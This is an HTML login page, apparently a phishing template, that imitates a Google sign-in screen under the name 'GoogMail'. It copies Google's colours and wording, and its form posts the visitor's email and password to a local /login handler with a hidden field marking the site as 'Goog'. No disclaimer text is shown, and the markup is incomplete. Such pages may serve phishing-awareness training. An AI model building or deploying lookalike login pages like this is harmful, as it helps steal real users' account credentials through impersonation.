<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>GoogMail Login</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;

      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }

    .login-container {
      text-align: center;
      border-radius: 10px;
      border: 1px solid #ccc;
      padding: 20px;
      width: 448px;
      background-color: #fff;

    }

    .logo {
      margin-bottom: 20px;
      margin-left: 15px;
    }

    .signin-text {
      font-size: 24px;
      color: rgb(32, 33, 36);
      font-weight: 400;
    }

    .sub-text {
      font-size: 16px;
      color: rgb(32, 33, 36);
      font-weight: 400;
      padding-top: 10px;
      margin-bottom: 20px;
    }

    .input-field {
      width: 366px;
      padding: 10px;
      height: 28px;
      font-size: 16px;
      color: rgb(32, 33, 36);
      font-weight: 400;
      text-align: left;
      margin-bottom: 15px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    .input-field::placeholder {
      color: rgb(38, 38, 38);
      font-size: 16px;
      font-weight: 400px;
    }

    .blue-btn {
      background-color: rgb(26, 115, 232);
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }

    .blue-btn:hover {
      background-color: rgb(25, 104, 207);
    }

    .disclaimer {
      position: absolute;
      bottom: 0;
      font-size: 16px;
      color: rgb(32, 33, 36);
      font-weight: 400;
      opacity: 30%;
    }
  </style>
</head>

    <div class="signin-text">Sign in</div>
    <div class="sub-text">to continue to GoogMail</div>
    <form id="myForm" action="/login" method="post">
      <input type="text" class="input-field" placeholder="Email or phone" name="username">
      <input type="password" class="input-field" placeholder="Password" name="password">
      <input type="hidden" name="website" value="Goog">
      <button type="submit" class="blue-btn">Next</button>
    </form>
